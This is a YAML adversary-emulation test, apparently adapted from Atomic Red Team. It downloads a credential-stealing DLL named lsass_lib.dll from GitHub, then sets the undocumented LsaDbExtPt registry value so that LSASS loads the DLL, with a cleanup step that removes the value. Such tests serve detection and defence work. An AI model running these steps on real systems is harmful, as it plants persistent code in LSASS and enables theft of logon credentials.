api_version: "2.0"
name: Modify Registry to load Arbitrary DLL into LSASS - LsaDbExtPt
description: "The following Atomic will modify an undocumented registry key that may be abused to load a arbitrary DLL into LSASS. \n\nUpon execution, the registry key will be modified and a value will contain the path to the DLL. \nReference: https://blog.xpnsec.com/exploring-mimikatz-part-1/ and source https://github.com/oxfemale/LogonCredentialsSteal\nNote that if any LSA based protection is enabled, this will most likely not be successful with LSASS.exe loading the DLL.\n"
args:
    - name: dll_path
      type: path
      default: PathToAtomicsFolder\..\ExternalPayloads\lsass_lib.dll
uuid: 8ecef16d-d289-46b4-917b-0dba6dc81cf1
mitre:
    tactics:
        - 'TA0003: Persistence'
        - 'TA0004: Privilege Escalation'
    techniques:
        - 'T1547: Boot or Logon Autostart Execution'
    subtechniques:
        - 'T1547.008: LSASS Driver'
requirements:
    platforms:
        - os: windows
steps:
    - name: |
        lsass_lib.dll must exist on disk at specified location (#{dll_path})
      inline: |
        if (Test-Path "#{dll_path}") {exit 0} else {{[Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12
        New-Item -Type Directory "PathToAtomicsFolder\..\ExternalPayloads\" -ErrorAction Ignore -Force | Out-Null
        Invoke-WebRequest "https://github.com/oxfemale/LogonCredentialsSteal/raw/53e74251f397ddeab2bd1348c3ff26d702cfd836/lsass_lib/x64/Release/lsass_lib.dll" -UseBasicParsing -OutFile "#{dll_path}"
        }}
      executor: powershell
    - name: modify-registry-to-load-arbitrary-dll-into-lsass---lsadbextpt
      inline: |
        New-ItemProperty -Path HKLM:\SYSTEM\CurrentControlSet\Services\NTDS -Name LsaDbExtPt -Value "{{.Args.dll_path}}"
      executor: powershell
      cleanup:
        inline: |
            Remove-ItemProperty -Path "HKLM:\SYSTEM\CurrentControlSet\Services\NTDS" -Name "LsaDbExtPt" -ErrorAction Ignore | Out-Null
        executor: powershell
